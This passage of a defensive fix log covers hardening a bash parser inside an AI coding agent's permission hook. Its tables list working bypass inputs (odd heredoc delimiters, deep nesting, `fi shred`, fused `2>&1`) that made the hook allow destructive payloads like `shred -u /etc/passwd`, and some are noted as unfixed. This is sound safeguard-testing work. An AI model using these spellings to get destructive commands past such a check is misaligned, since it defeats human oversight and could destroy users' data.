| `TestRound6TruncationIsNotSilent` | — | **10 / 112** (new) |
| `TestRound6HeredocTerminatorIsAnExactLine` | — | **7 / 107** (new) |
| `TestReservedWordPositionIsDerivedFromTokens` | 13 / 479 | **13 / 479** |
| `TestBashOperatorTableIsBashs` | 14 / 170 | **14 / 170** |
| `TestSeparatorSuppressionTokens` | 41 / 261 | **41 / 261** |
| `TestTrapHandlerAgainstRealBash` | 240 cases, no exemption list | **6 / 275, 240 cases, unchanged** |
| `tests/scenario_check.py` | 1 pre-existing failure | **diff-identical PASS/FAIL lines to round 5's parser** (19 lines, the same 1 failure) |
| faithfulness, path corpus (240) | 0 hidden | **0 hidden** |
| faithfulness, operator space (21024, 7771 run) | 0 hidden / 0 laundered | **0 / 0** |
| heredoc terminator grid (108 ALNUM-delimiter cells, 102 run) | 24 hidden | **0 hidden** — but see §14: with the delimiter as an axis (468 cells, 450 run) round 6 hides **348**, and 30/30 on CRLF |
| depth band (65…300, 25 rows) | 25 rows `allow` | **0 rows `allow`** |
| real traffic (2126 distinct) | — | **2 verdict changes, both faithfulness corrections** |

**Faithfulness, the one-sided property, four parsers, three corpora.** *bash
never runs a command the parser did not report.*

```
                                        HEAD     round 4   round 5   round 6
path corpus, 240 cases                    70        15         0         0
operator space, 21024 (7771 executed)   2079      1946         0         0
  ...laundered, fixture / live           548/731  1836/1836   0/0       0/0
heredoc terminator grid, 108 (102 run)    12         —        24         0
depth band, 25 rows                     0 hidden    —      25 laundered  0
```

The first row's corpus holds the DELIMITER fixed at three alphanumeric strings.
Round 7 re-runs it as a product with a delimiter axis and the same row reads
`HEAD 52 / round 6 348 / round 7 0` over 450 executed cells — §14.

Round 5's two columns are reproduced **to the digit** — the review's
independent reproduction and this one agree, and the corpora are the ones in
the checkout (`_RESERVED_WORD_POSITION_PATHS × _GROUND_TRUTH_PAYLOADS`,
`_operator_space_slots() × _OPERATOR_SPACE_SHAPES`).

**Real-traffic differential.** 2126 distinct commands (4002 occurrences),
re-harvested from `~/.claude/bash_hook_debug.log` + its rotated `.gz` archives
+ `~/.claude/permission_requests.jsonl`, replayed under the real
`SettingsLoader` (`allow=295 deny=9 ask=0`, asserted in the harness), 0 parse
exceptions in every pass.

```
round 5 -> round 6:   verdict 2    split 2    write-target 0
HEAD    -> round 6:   verdict 2    split 10   write-target 0
round 4 -> round 6:   verdict 2    split 5    write-target 0
HEAD    -> round 5:   verdict 0    split 10   write-target 0
```

**The direction of both verdict changes, named rather than counted.** Both are
`ask -> allow`, both are the same shape, and both are the prefix-match
over-report from §12.7's change 2 being *corrected*:

```
cat > …/resubject.js <<'JS'
const fs=require('fs');
…
JSON.parse(m);          <- column 0, prefix-matches the delimiter `JS`
…
JS
node …/resubject.js

  HEAD    ['cat', 'fs.writeFileSync(mf,m', "console.log('manifest updated'",
           'JS', 'node …']
  round 5 ['cat ON.parse(m', 'fs.writeFileSync(mf,m', …, 'JS', 'node …']
  round 6 ['cat', 'node …']
```

Measured against bash with `cat`/`node` shadowed by shell functions: bash runs
**exactly two** commands, `cat` and `node`. Round 6's split is the faithful
one; HEAD's and round 5's invented four sub-commands the shell never runs, and
the invented `JS` is what forced the `ask`. This is the only place in the whole
task where a move toward `allow` is the *correct* answer, so it is stated with
its oracle rather than filed under "no change". `FEWER sub-commands: 2` counts
these two and nothing else; every other row in the corpus is byte-identical.

**Blast radius, re-probed through `.claude/hooks/pretool_hook.py` as a PROCESS
with a real hook payload on stdin**, under the LIVE merged settings — not
`--dry-run`, not the validator in-process, because "exit 0 with empty stdout"
is invisible to every other harness:

```
                                                  HEAD      round 5   round 6
<<EOF shred git status                            allow     deny      deny
echo hi ; <<-1 shred git status                   deny      deny      deny
cat <<-EOF/\thello/\tEOF/shred git status         deny      deny      deny
cat <<E/E/shred git status                        allow     deny      deny
cat <<'a b'/a b/shred git status                  allow     deny      deny
case a in esac<<<x ; shred -u /etc/passwd         deny      deny      deny
case a in esac<x ; shred -u /etc/passwd           allow     deny      deny
("1"*4301) + ">& f\nshred -u /etc/passwd"         deny      deny      deny
("$((" * 3000) + "\nshred -u /etc/passwd"         NO OUTPUT ask       ask
("$(" * 3000) + "\nshred -u /etc/passwd"          NO OUTPUT ask       ask
echo hi ; 1>&- shred -u /etc/passwd               ask       deny      deny
shred -u /etc/passwd                              deny      deny      deny
--- the two round-6 blockers ---------------------------------------------
cat <<EOF/EOF cat <<Z/EOF/shred -u /etc/passwd    deny      ALLOW     deny
cat <<EOF/EOF echo 'x/EOF/shred -u /etc/passwd    deny      ALLOW     deny
echo A $(x65 shred -u /etc/passwd)                deny      ALLOW     ask
echo A <(x65 shred -u /etc/passwd)                deny      ALLOW     ask
echo A $((x65 $(shred -u /etc/passwd)))           deny      ALLOW     ask
echo A $(x65 echo x > /etc/passwd)                ask       ALLOW     ask
echo A $(x64 shred -u /etc/passwd)  [at the cap]  deny      deny      deny
echo A $(x64 echo hi)  [benign, at the cap]       allow     allow     allow
```

No row is `NO OUTPUT` on round 6: the new depth handling did **not** reintroduce
the fail-open, and all five `_FAIL_OPEN_CRASH_INPUTS` classes still answer
`deny` or `ask` on the real hook path (asserted by round 5's own process-level
test, still green, plus `test_the_truncation_answers_at_the_real_hook` for the
new band).

Identical through `permissions-mcp/permissions_mcp_lib.py`'s
`_build_validator()` (`allow=295 deny=9`, parser module resolution asserted):
the two heredoc witnesses `deny`, the four depth rows `ask`, the at-the-cap row
`deny`. `.claude/hooks/telegram_permission_router.py` builds its validator
inline from the same two modules and inherits identically.

**Tests added — 17 methods, every one watched to fail on the round-5 parser
first** (a `cp -a` copy with round 5's `bash_command_parser.py` dropped in;
`git checkout` is never used on this shared checkout). On round 5 the two new
classes fail **62 failures + 27 errors**; the 24 rows appended to the standing
doors corpus add **48** more failures to `TestHeredocAndCasePatternDoors`. On
round 6 all of them pass.

```
TestRound6TruncationIsNotSilent                       10 methods / 112 subtests
  test_bash_runs_the_payload_past_the_cap             the premise, per carrier
  test_the_band_is_the_cap_and_not_the_frame_limit    why round 5 could not see it
  test_no_depth_past_the_cap_answers_allow            the blocker
  test_the_allowlist_would_really_have_allowed_…      anti-vacuity for it
  test_the_truncation_is_reported_as_a_sub_command    the mechanism
  test_the_write_target_gate_reports_its_truncation…  the fourth gate
  test_the_sentinels_are_unmatchable                  the property both rely on
  test_nesting_that_bottoms_out_at_the_cap_still_…    the cost, bounded
  test_the_cap_still_stops_the_raise                  no fail-open traded back
  test_the_truncation_answers_at_the_real_hook        as a PROCESS

TestRound6HeredocTerminatorIsAnExactLine               7 methods / 107 subtests
  test_the_minimal_witness                            one row, spelled out
  test_the_whole_fuzz_grid_hides_nothing              108 cells, bash oracle
  test_a_body_line_that_merely_begins_with_the_…      the rule, both directions
  test_the_two_round_5_changes_are_safe_only_together both halves pinned
  test_the_tab_stripped_terminator_is_exact_after_…   `<<-` strips tabs, nothing else
  test_the_substitution_scanners_keep_bashs_prefix…   the measured asymmetry
  test_the_rule_holds_inside_a_substitution_and_a_…   the rule reaches inside

corpora added, all in tests/test_integration_pretool.py
  _HEREDOC_PREFIX_TERMINATOR_TRIPLES     24 measured rows, appended to
                                         _HEREDOC_AND_PATTERN_DOORS (18 -> 42)
  _HEREDOC_TERMINATOR_FUZZ_*             the 108-cell grid they came from
  _DEPTH_CAP_DOORS                       5 depths x 4 carriers = 20
  _DEPTH_CAP_WRITE_DOORS                 5 depths, write-redirect shape
  _COMSUB_EXTENT_ROWS                    5 rows of bash's extent rule
```

### 13.5 Mutation matrix — 16 mutations, 16 caught

**Numbering stays round-qualified** (§10.8 is R3-M1..M23, §11.9 is R4-M1..M16,
§12.8 is R5-M1..M14); this round's is **R6-M1 .. R6-M16**.

Each mutation is applied to a `cp -a` copy of `.claude/hooks` + `tests` in a
`mkdtemp` — never the repo — and scored against the whole of
`test_integration_pretool.py`. The copy has baseline failures of its own, so
the baseline is stated rather than subtracted silently.

> **Corrected in round 7.** This said **1** baseline failure. Re-measured, a
> `cp -a` copy under `/tmp/<name>/tests` has **2**, both path-sensitive:
> `test_dot_alias_does_not_over_match_relative_path` AND
> `test_escaping_relative_path_is_not_workspace_binary`. The baseline is also
> sensitive to WHERE the copy lands — a copy directly under `/tmp` reads **1**.
> No verdict in the table below changes (the smallest row is 10). Round 7's own
> matrix states its baseline from a NO-OP control run through the same harness
> rather than from a separate run — §14.4.

| # | mutation | failures |
|---|---|---|
| R6-M1 | tokenizer terminator back to a PREFIX match (the blocker, verbatim) | **87** |
| R6-M2 | tokenizer terminator: drop the end-of-input arm (`cat <<E\nE` with no trailing newline) | **10** |
| R6-M3 | tokenizer terminator: accept any non-letter after the delimiter | **86** |
| R6-M4 | drop the `<<-` tab strip in the tokenizer (round 5 item 2, re-broken) | **22** |
| R6-M5 | drop round 5's first-body-line test (round 5 item 3, re-broken) | **26** |
| R6-M6 | unify `_scan_paren_subst` onto the tokenizer's EXACT rule | **13** |
| R6-M7 | unify `_scan_backtick` onto the tokenizer's EXACT rule | **10** |
| R6-M8 | `parse_with_offsets` truncates in SILENCE again (the blocker, verbatim) | **26** |
| R6-M9 | `_scan_arith` truncates in SILENCE again (the arithmetic carrier) | **22** |
| R6-M10 | `_scan_write_targets` truncates in SILENCE again | **15** |
| R6-M11 | the sub-command sentinel is emitted UNCONDITIONALLY (cap becomes 63 in practice) | **11** |
| R6-M12 | the sub-command sentinel is an allowlistable word (`echo unparsed`) | **18** |
| R6-M13 | the write-target sentinel is a resolvable path (`/tmp/unparsed`) | **11** |
| R6-M14 | the cap is raised past the frame limit (4000 — the RecursionError returns) | **39 + 7 errors** |
| R6-M15 | the cap is raised above the swept band (400) | **36** |
| R6-M16 | the cap is lowered below what a human writes (2) | **12** |

R6-M6 and R6-M7 are the two that matter most for the future: they are the
"tidy up the inconsistency" edit a later round is most likely to make, and they
now fail. R6-M11 is the one that would be invisible without a test — the parser
would still be safe, it would just prompt on a nesting the cap says is fine.

### 13.6 Found and RECORDED, not fixed

§12.9's list stands, with the round-5 review's severity calls attached and one
item removed because it was a blocker rather than a file-it.

1. **`SCAFFOLDING_KEYWORDS` reduces a whole sub-command to `''`, which
   auto-allows** — `fi shred -u /etc/passwd` → `allow` (also `done …`,
   `esac …`, `for …`). Toward `allow`, but **identical at HEAD** and latent
   because bash rejects those strings. File it; not a round-6 regression.
2. **A quoted or escaped command WORD is never unquoted** — `'shred' git
   status` → `ask` where bash runs `shred`. Deny → ask only; the same "bash
   sees a command the parser does not" class on an unswept surface.
3. **`FUSED_FD_OPERATORS` is not word-boundary gated** — `./scripts/build2>&1
   --all` → `allow`, parsed as `./scripts/build --all`, while bash runs
   `./scripts/build2 --all`. The review built both binaries and confirmed it.
   Genuinely toward `allow` and the **highest-severity** item on this list —
   but **identical at HEAD**, so a file-it and not a landing blocker. The
   fd-prefix branch already has the right rule (`not current and not
   word_open`); the fused spellings are matched by `_check_operator` before it
   and inherit no such gate.
4. ~~The heredoc terminator is a PREFIX match~~ — **this was BLOCKER 2 and is
   fixed in §13.2**, not a file-it. Its §12.9 entry is corrected in place.
5. **`{v}>& /etc/passwd` over-reports a write target** — `ask`, where HEAD
   allowed. Over-reporting a write; costs a prompt, never an allow.
6. **NEW (round 6): the residual WORD of a prefix-closed heredoc inside `$(…)`
   is dropped.** `printf A $(cat <<EOF\nEOFY )\nEOF\nprintf T\n) ; printf Z` —
   bash runs a command `Y` (the residual between the prefix-matched delimiter
   and the paren) and the parser does not report it. **Identical on HEAD and on
   round 5**, so pre-existing and not a regression; recorded with an explicit
   `known_gap` in `_COMSUB_EXTENT_ROWS` so it cannot quietly grow.

### 13.7 Residual risk after round 6

- **Still not installed.** Unchanged and still the largest exposure: every fix
  in §9 through §13 is live in the working tree only. `~/.claude/hooks/`
  carries none of them until someone re-runs `./install-claude-config.sh`.
  Operator action.
- **`main()` still fails OPEN.** Round 6 changes nothing about the blanket
  `except Exception: sys.exit(0)`; it only keeps more inputs from reaching it.
  `tasks/34_nul_byte_fail_open.md`'s question.
- **Past `MAX_SUBSTITUTION_DEPTH` (64) nested substitutions are still not
  extracted** — but the refusal is now REPORTED, so the answer is `ask` and not
  `allow`. The cost is a prompt on nesting deeper than the cap, benign or not.
- **The two substitution scanners deliberately disagree with the tokenizer**
  about what closes a heredoc, because bash does (§13.2). That asymmetry is
  measured and pinned, and it is exactly the kind of thing a future round will
  be tempted to "unify"; the test will fire.
- **The five items of §13.6**, of which #1 and #3 are toward `allow` and both
  are identical at HEAD.
- **`([[ … ]])` glued, with no space, still mis-splits** toward `ask` (§9.2).
- **MISSING FROM THIS LIST, and it was the round-7 blocker: the DELIMITER
  axis.** §13.7 named the substitution scanners, the depth cap, the glued
  `([[`, and five §13.6 items — and said nothing about what
  `_parse_heredoc_delim` accepts as a delimiter WORD, which is the one thing
  §13.2's change made load-bearing. The whole test file's unquoted heredoc
  delimiters were alphanumeric (`1 b D E EOF w x Z`), so the axis had zero
  coverage and a break in it passed the suite unchanged. Fixed and swept in
  §14; the general lesson is in §14.7.
- **The parser is still a hand-written tokenizer, not bash.** Round 5's version
  of this paragraph said the next door would be found on an unswept AXIS, and
  named quoting of the command word. Round 6 refutes the framing again, in a
  new way: **both of its blockers were in code round 5 itself had just
  written**, in the two places round 5 chose to write a comment asserting the
  direction was safe instead of a test measuring it. The lesson that
  generalizes is not about axes. It is that **a claimed direction with no
  oracle behind it is the thing to distrust** — the corpora caught nothing here
  because neither defect was reachable from the shapes they enumerate, and both
  were reachable from the two sentences that said "never toward allow". Round
  6's own claims are therefore stated with the measurement attached, and the
  two families are standing corpora rather than prose.
- Everything else in §8.9, §9.8, §10.10, §11.10 and §12.10 stands unchanged,
  as corrected in place.

## 14. Fix log (round 7 — fixer, after the round-6 review FAILED)

Round 6's review found **one blocker** and confirmed everything else
independently. The blocker is the sharpest thing this task has produced, and it
is not a careless edit: **round 6's fix was correct, and it exposed a
pre-existing bug by removing an accident that had been masking it.**

`_parse_heredoc_delim` scanned an unquoted heredoc delimiter as
`[A-Za-z0-9_]*` — since round 4, and at HEAD. So `<<EOF-1` yielded the
delimiter `EOF` and stranded `-1` in the token stream. HEAD never noticed
because HEAD's terminator comparison was a **prefix** match: the truncated
`EOF` still prefix-matched the real terminator line `EOF-1`, and the body
closed correctly by accident. §13.2 made the tokenizer's comparison **exact**,
which is what bash does and what closed round 6's own blocker — and the mask
came off:

```
cat <<EOF-1
body
EOF-1
shred -u /etc/passwd

  HEAD     ->  deny   ['cat -1', 'shred -u /etc/passwd']
  round 6  ->  ALLOW  ['cat -1']            <- the body never closes
  round 7  ->  deny   ['cat', 'shred -u /etc/passwd']
  bash     ->  runs the payload
```

The exact-line rule is **right and stays**. The scanner was the bug.

### 14.1 The blocker, reproduced before anything was changed

Ten witnesses, one shape each (`cat <<D / body / <terminator> / payload`),
parsed by three parsers loaded side by side from `/tmp` copies:

| spelling | HEAD | round 6 | round 7 | bash |
|---|---|---|---|---|
| `<<EOF-1` | `deny ['cat -1', 'shred …']` | **ALLOW `['cat -1']`** | `deny ['cat', 'shred …']` | runs it |
| `<<EOF.txt` | `deny ['cat .txt', …]` | **ALLOW `['cat .txt']`** | `deny` | runs it |
| `<<my-doc` | `deny ['cat -doc', …]` | **ALLOW `['cat -doc']`** | `deny` | runs it |
| `<<'E'OF` | `deny ['cat OF', …]` | **ALLOW `['cat OF']`** | `deny` | runs it |
| `<<E'O'F` | `deny ['cat OF', …]` | **ALLOW `["cat 'O'F"]`** | `deny` | runs it |
| `<<E"O"F` | `deny ['cat OF', …]` | **ALLOW `['cat "O"F']`** | `deny` | runs it |
| `<<E\OF` | `deny ['cat OF', …]` | **ALLOW `['cat \OF']`** | `deny` | runs it |
| `<<-EOF-1` | `deny` | **ALLOW `['cat -1']`** | `deny` | runs it |
| `<<EOF` + CRLF | `deny ['cat', 'shred …']` | **ALLOW `['cat']`** | `deny` | runs it |
| `<<EOF` (alnum) | `deny` | `deny` | `deny` | runs it |

Note the two things HEAD got wrong even while answering `deny`: the stranded
`-1` / `.txt` / `OF` became an ARGUMENT of `cat`. Round 7 removes that too —
the delimiter is consumed, so the head is plain `cat`.

**Through the real hook as a PROCESS**, live merged settings replaced by
`deny=[Bash(shred:*)] allow=[Bash(cat:*), …]`, payload on stdin:

```
                                          HEAD    round 6   round 7
cat <<EOF-1/body/EOF-1/shred              deny    ALLOW     deny
cat <<EOF.txt/body/EOF.txt/shred          deny    ALLOW     deny
cat <<my-doc/body/my-doc/shred            deny    ALLOW     deny
cat <<'E'OF/body/EOF/shred                deny    ALLOW     deny
cat <<E'O'F/body/EOF/shred                deny    ALLOW     deny
cat <<E"O"F/body/EOF/shred                deny    ALLOW     deny
cat <<E\OF/body/EOF/shred                 deny    ALLOW     deny
cat <<-EOF-1/body/EOF-1/shred             deny    ALLOW     deny
cat <<EOF\r\n … (CRLF)                    deny    ALLOW     deny
cat <<$(echo E)/body/$(echo E)/shred      deny    deny      deny
```

Identical through `permissions-mcp/permissions_mcp_lib.py`'s
`_build_validator()` (parser module resolution asserted:
`.claude/hooks/bash_command_parser.py`).

**Scale.** Two independent sweeps, both bash-oracled:

```
                                              HEAD   round 6   round 7
delimiter x residual x operator grid
  468 cells, bash runs the payload in 450        52       348         0
CRLF corpus, 30 cells, all 30 executed           6        30         0
single-shape ASCII sweep `E<ch>F`, 91 executed   0        23         0
```

The 23 characters round 6 hides on the single-shape sweep are
`! # $ % * + , - . / : = ? @ [ \ ] ^ { } ~` and CR. Every one of them is an
ordinary word character to bash and a heredoc delimiter people actually write
(`<<PY3.11`, `<<my-doc`, `<<EOF.txt`), and CR is simply what a heredoc looks
like in a Windows-authored script.

### 14.2 The fix — one word scanner, quoted and unquoted alike

`bash_command_parser.py`, `_parse_heredoc_delim`. The two truncating branches
(the leading-quote early return, and the alnum loop) are replaced by a single
scan of the whole WORD, with quote removal, ending at an unquoted blank or
metacharacter.

```python
HEREDOC_DELIM_TERMINATORS = frozenset(' \t\n|&;()<>')
```

That set is bash's `shell_meta_chars` plus the blanks. Everything else — `-`,
`.`, `:`, `=`, `#`, `!`, `*`, `$`, `{`, `}`, CR — is an ordinary word
character and belongs to the delimiter.

**Folding the two paths is the part that matters**, and the round-6 reviewer's
own PoC is the evidence: a word scan alone takes 6 of 7 witnesses to `deny` and
leaves `<<'E'OF` leaking, because a separate leading-quote branch returns at the
closing quote and can never see the `OF` glued after it. One scanner cannot
make that mistake.

Measured on bash 5.3.9, one row per spelling, `cat <<D / body / <line> /
echo TAIL` — TAIL runs iff the terminator matched, so the second column is
bash's answer and not a guess:

```
spelling      bash's delimiter   why
<<EOF-1       EOF-1              `-` is not a metacharacter
<<EOF.txt     EOF.txt            nor is `.`
<<E:F         E:F                nor `:`, `=`, `#`, `!`, `*`
<<${X}        ${X}               NOT expanded, and `{`/`}` are word chars
<<$X          $X                 nor is a bare `$` expanded
<<E'O'F       EOF                quote removal, mid-word
<<'E'OF       EOF                quote removal, leading quote
<<"E\$F"      E$F                `\` escapes `$` inside `"`
<<"E\OF"      E\OF               but is LITERAL before anything else
<<'E\OF'      E\OF               and always literal inside `'`
<<E\ F        E F                an escaped blank JOINS the word
<<E\;F        E;F                as does an escaped metacharacter
<<E\<nl>F     EF                 `\`+newline is a line continuation
<<EOF\r       EOF\r              CR is an ordinary character
<<EOF;        EOF                `;` `|` `&` `<` `>` `(` `)` and blanks END it
```

**The one construct not reproduced, deliberately.** bash absorbs a whole
substitution into the word *through* a metacharacter: `cat <<$(echo E)` has the
literal, unexpanded delimiter `$(echo E)`. Rather than grow a second nested
scanner inside the delimiter parser, an unquoted `$(`, `$((` or backtick makes
`_parse_heredoc_delim` **refuse the heredoc**. That is not a new answer — the
alnum scan already refused those spellings, because `$` is not alphanumeric —
and refusing leaves the text to be tokenized as commands, which can only report
MORE. Measured `deny` at HEAD, round 6 and round 7 alike.

The round-5 refusals are unchanged and re-pinned: an empty, unterminated, or
line-spanning quoted delimiter is still not a heredoc, `<<` with no word is
still not a heredoc, and `<<<` is still a here-string.

**`()` in the terminator set is load-bearing, not cosmetic.**
`_scan_paren_subst` counts parens to find a substitution's extent, so a
delimiter that ate the `)` never closes the substitution and swallows the rest
of the script. bash warns "unterminated here-document" and runs the tail:
`echo $(cat <<EOF)\nbody\nEOF\nshred …` must report `shred`, and does. Pinned
(mutation R7-M7).

### 14.3 Why it shipped past round 6 — the axis with zero coverage

`_HEREDOC_TERMINATOR_FUZZ_DELIMITERS = ("EOF", "E", "Z9")`. The 108-cell grid
varies the residual 18 ways and the operator 2 ways and holds the **delimiter**
fixed at three alphanumeric strings. Across the whole 6103-line test file,
every unquoted heredoc delimiter was alphanumeric — `1 b D E EOF w x Z`. The
axis had **zero** coverage, so a fix for it passed the suite unchanged and a
break in it did too.

That is **partly** fixed — see the correction below this list — by the
following, rather than by adding the ten witnesses:

- **`_HEREDOC_TERMINATOR_FUZZ_DELIMITERS` is now a `(spelling, terminator)`
  axis of 13** — the round-6 three, six non-alnum word spellings, and four
  quote-removal spellings. The pair is needed because quote removal makes the
  two differ: `<<'E'OF` is terminated by the line `EOF`. The 108-cell grid is
  now the 468-cell **product**; bash runs the payload in 450 and round 7 hides
  0 (`test_the_whole_fuzz_grid_hides_nothing`).
- **`_HEREDOC_CRLF_FUZZ_*`, a 30-cell corpus**, because a CRLF document needs
  the `\r` on every line and the shared case builder could not express it
  (`test_the_crlf_grid_hides_nothing`).
- **22 rows appended to the standing `_HEREDOC_AND_PATTERN_DOORS`** (42 → 64),
  so the three tests over that corpus — bash-runs-the-tail, nothing-hidden,
  nothing-laundered — now cover the delimiter axis and cannot regress silently.
- **`TestRound7HeredocDelimiterIsAWholeWord`, 12 methods / 129 subtests**,
  pinning the word rule itself with bash as the oracle for every row.

> **CORRECTION (round 8).** "Fixed structurally" was wrong, and round 8's two
> blockers are the proof: both are delimiter-word defects and both survived
> everything listed above. The 13-entry axis varies **which characters** a
> delimiter contains. It has no **quoting-form** dimension — no row anywhere in
> which a `$` is adjacent to a quote, so `$'…'` (ANSI-C) and `$"…"` (locale)
> appear nowhere in the parser, the tests or this document — and no **`<<-` ×
> leading-whitespace** dimension, so no row has a delimiter whose first
> character is a TAB. Those are exactly the two shapes round 7 got wrong, and
> the reason a 468-cell grid, a 30-cell CRLF corpus, 64 doors, 17 mutations and
> 505 new-test assertions all passed over them. An axis closes the shapes it
> enumerates and nothing else; calling that "structural" is what let the same
> class recur. Both dimensions are added in §15.3, as products with the
> existing grid.

### 14.4 Verification

| | round 6 | round 7 |
|---|---|---|
| `tests/run_all_tests.py` | 1494 ran, OK, 1 skipped | **1507 ran, OK, 1 skipped** |
| `bash_command_parser.py` self-test | 107 / 0 | **107 / 0** |
| `test_integration_pretool.py` | 348 methods / 1668 subtests | **361 / 2241** |
| `TestHeredocAndCasePatternDoors` | 16 / 138 (corpus 42) | **16 / 204** (corpus 42 → 64) |
| `TestRound6HeredocTerminatorIsAnExactLine` | 7 / 107 | **8 / 485** (grid 108 → 468, + CRLF 30) |
| `TestRound7HeredocDelimiterIsAWholeWord` | — | **12 / 129** (new) |
| `TestRound6TruncationIsNotSilent` | 10 / 112 | **10 / 112** |
| `TestReservedWordPositionIsDerivedFromTokens` | 13 / 479 | **13 / 479** |
| `TestBashOperatorTableIsBashs` | 14 / 170 | **14 / 170** |
| `TestSeparatorSuppressionTokens` | 41 / 261 | **41 / 261** |
| `TestTrapHandlerAgainstRealBash` | 6 / 275, 240 cases | **6 / 275, 240 cases, unchanged** |
| `tests/scenario_check.py` | 19 lines, 1 pre-existing failure | **byte-identical to round 6** |
| faithfulness, path corpus (240) | 0 hidden | **0 hidden** |
| faithfulness, operator space (21024, 7771 run) | 0 / 0 | **0 / 0** |
| heredoc grid — **delimiter as an axis** (468, 450 run) | 348 hidden | **0 hidden** |
| heredoc CRLF corpus (30, 30 run) | 30 hidden | **0 hidden** |
| depth band (65…300, 25 rows) | 0 `allow` | **0 `allow`** |
| real traffic (2203 distinct) | — | **0 verdict changes vs round 6** |

**Faithfulness, the one-sided property.** *bash never runs a command the parser
did not report.*

```
                                              HEAD   round 5   round 6   round 7
path corpus, 240 cases                          70        0         0        0
operator space, 21024 (7771 executed)         2079        0         0        0
heredoc grid, ALNUM delimiters, 108 (102)       12       24         0        0
heredoc grid, delimiter AXIS, 468 (450)         52        —       348        0
heredoc CRLF corpus, 30 (30)                     6        —        30        0
ASCII single-shape sweep, 91 executed            0        —        23        0
depth band, 25 rows                       0 hidden      25 l.       0        0
```

**Real-traffic differential.** 2203 distinct commands (3573 occurrences),
re-harvested from `~/.claude/bash_hook_debug.log` + its five rotated `.gz`
archives + `~/.claude/permission_requests.jsonl`, replayed under the real
`SettingsLoader` on the repo workspace (`allow=295 deny=9 ask=0`, asserted), 0
parse exceptions in every pass, verdict distribution `ask=1615 allow=588`.

```
round 6 -> round 7:   verdict 0    split 0    write-target 0
HEAD    -> round 7:   verdict 2    split 10   write-target 0
HEAD    -> round 6:   verdict 2    split 10   write-target 0
```

**Round 7 is a no-op on real traffic** — every delimiter in 2203 real commands
is either alphanumeric or wholly quoted (`<<'JS'`, `<<'PY'`, `<<'EOF'`), which
is precisely why the axis stayed invisible for four rounds. `HEAD -> round 7`
is byte-identical to `HEAD -> round 6`: the two verdict changes and ten split
changes are §13.4's, already justified there (both verdicts are `ask -> allow`
and both are the prefix-match over-report being corrected; bash, with `cat` and
`node` shadowed, runs exactly the two commands round 6/7 report). Nothing new
moves.

**Blast radius, through `.claude/hooks/pretool_hook.py` as a PROCESS** under
the same fixture, all 30 rows — round 6's 20 plus round 7's 10 — are in §14.1
and in the table below for the round-6 rows:

```
                                                  HEAD      round 6   round 7
<<EOF shred git status                            allow     deny      deny
echo hi ; <<-1 shred git status                   deny      deny      deny
cat <<-EOF/\thello/\tEOF/shred git status         deny      deny      deny
cat <<E/E/shred git status                        allow     deny      deny
cat <<'a b'/a b/shred git status                  allow     deny      deny
case a in esac<<<x ; shred -u /etc/passwd         deny      deny      deny
case a in esac<x ; shred -u /etc/passwd           allow     deny      deny
("1"*4301) + ">& f\nshred -u /etc/passwd"         deny      deny      deny
("$((" * 3000) + "\nshred -u /etc/passwd"         NO OUTPUT ask       ask
("$(" * 3000) + "\nshred -u /etc/passwd"          NO OUTPUT ask       ask
echo hi ; 1>&- shred -u /etc/passwd               ask       deny      deny
shred -u /etc/passwd                              deny      deny      deny
cat <<EOF/EOF cat <<Z/EOF/shred                   deny      deny      deny
cat <<EOF/EOF echo 'x/EOF/shred                   deny      deny      deny
echo A $(x65 shred -u /etc/passwd)                deny      ask       ask
echo A <(x65 shred -u /etc/passwd)                deny      ask       ask
echo A $((x65 $(shred -u /etc/passwd)))           deny      ask       ask
echo A $(x65 echo x > /etc/passwd)                ask       ask       ask
echo A $(x64 shred -u /etc/passwd)  [at the cap]  deny      deny      deny
echo A $(x64 echo hi)  [benign, at the cap]       allow     allow     allow
```

No row is `NO OUTPUT` on round 7, and **all five `_FAIL_OPEN_CRASH_INPUTS`
classes still answer on the real hook path** — `int_conversion_limit` `deny`,
`nested_arithmetic` `ask`, `nested_substitution` `ask`,
`nested_process_substitution` `ask`, `nested_backticks` `deny`.

**The one direction round 7 moves toward `allow`, named with its oracle.**
`cat <<EOF-1 / body / EOF / shred -u /etc/passwd` — the terminator never
appears. HEAD reports `['cat -1', 'shred …']`; round 7 reports `['cat']`. bash
**warns "here-document delimited by end-of-file" and runs nothing after the
`cat`** — it swallows the payload exactly as we do. HEAD only reported the tail
because it had truncated the delimiter into something that DID match. Round 7
is the faithful reading. Asserted with the bash oracle in
`test_a_delimiter_bash_can_never_match_swallows_in_both`.

### 14.5 Mutation matrix — 17 mutations, 16 caught, 1 behaviour-preserving

Numbering stays round-qualified (§10.8 R3-M*, §11.9 R4-M*, §12.8 R5-M*, §13.5
R6-M*); this round is **R7-M1 .. R7-M17**.

Each mutation is applied to a `cp -a` copy of `.claude` + `tests` in a
`mkdtemp` — never the repo — and scored against the whole of
`test_integration_pretool.py` (361 methods). **The baseline is a NO-OP control
run through the identical harness**, rather than a separate run, because the
two path-sensitive failures are sensitive to where the copy lands:

| # | mutation | failures |
|---|---|---|
| **R7-M0** | **NO-OP control — this is the baseline** | **1** |
| R7-M1 | delimiter scanned as alnum-only again (the blocker, verbatim) | **480** |
| R7-M2 | the leading-quote branch returns early again (the reviewer's PoC trap) | **52** |
| R7-M3 | no quote removal: the quote characters stay in the delimiter | **160** |
| R7-M4 | `-` treated as a metacharacter (so `EOF-1` truncates again) | **99** |
| R7-M5 | newline dropped from the terminator set (the word runs past the line) | **650** |
| R7-M6 | `;` dropped from the terminator set (a real separator is swallowed) | **3** |
| R7-M7 | `)` dropped from the terminator set (the `$(…)` extent mislocates) | **4** |
| R7-M8 | an unquoted backslash is no longer removed | **52** |
| R7-M9 | the `$(`/backtick refusal is dropped (delimiter truncates to `$`) | **4** |
| R7-M10 | the unterminated-quote refusal is dropped | **3** |
| R7-M11 | the newline-in-a-quoted-delimiter refusal is dropped | **2** |
| R7-M12 | the empty-delimiter refusal is dropped | **6** |
| R7-M13 | the `<<<` here-string guard is dropped | **1 — NOT caught** |
| R7-M14 | CR treated as a metacharacter (CRLF documents regress) | **38** |
| R7-M15 | inside `"` a backslash escapes EVERYTHING | **4** |
| R7-M16 | tokenizer terminator back to a PREFIX match (R6-M1, re-scored) | **178** |
| R7-M17 | `_scan_paren_subst` unified onto the EXACT rule (R6-M6, re-scored) | **4** |

**R7-M13 is reported as not caught rather than quietly dropped, and it is not a
gap.** `<` is in `HEREDOC_DELIM_TERMINATORS`, so the word scan refuses a
here-string on its own and deleting the `<<<` fast path is behaviour-preserving
by construction. The guard is kept as the statement of intent, and
`test_the_here_string_guard_is_now_redundant_but_kept` pins the SECOND reason
